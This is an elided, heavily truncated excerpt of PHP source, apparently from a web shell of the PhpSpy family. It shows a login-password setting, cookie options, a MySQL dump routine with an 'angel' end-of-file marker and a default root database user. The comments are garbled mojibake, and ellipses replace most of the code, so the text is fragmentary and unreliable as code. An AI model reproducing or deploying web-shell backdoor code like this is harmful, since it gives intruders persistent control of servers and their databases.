...
/*===================== 넋埼토零 =====================*/
$admin = array();
// 角뤠矜狼쵱쯤駱聯, true 槨矜狼駱聯, false 槨殮쌈쏵흙.苟충朞淃橙轟槻
$admin['check'] = true;
// 흔벎矜狼쵱쯤駱聯,헝錦맣되쩍쵱쯤
$admin['pass']  = 'fuckq';

//흔퀭뚤 cookie 鱗痰렀鍋唐景喝狼헹, 샀되쩌꼇攣끽, 헝錦맣苟충긴좆, 뤠橙헝괏넣칵훰
// cookie 품留
$admin['cookiepre'] = '';
// cookie 鱗痰堵
$admin['cookiedomain'] = '';
...
if (!$dbname) {
	...
	if (!file_exists($mysqldlfile)) {
		...
		if(!$result){
			...
			//痰珂쇌늑윱깊刻쌔뙤,긁출놔君뗍혤菱샀관벵__angel_1111111111_eof__돨匡숭珂꼇供憐돨헙워
...
!$dbuser && $dbuser = 'root';
!$dbport && $dbport = '3306';
$charsets = array(''=>'Default','gbk'=>'GBK', 'big5'=>'Big5', 'utf8'=>'UTF-8', 'latin1'=>'Latin1', 'euckr'=>'euc-kr');
...
if($link && mysql_get_server_info() > '4.1') {
	if(in_array(strtolower($charset), array('gbk', 'big5', 'utf8', 'euckr'))) {
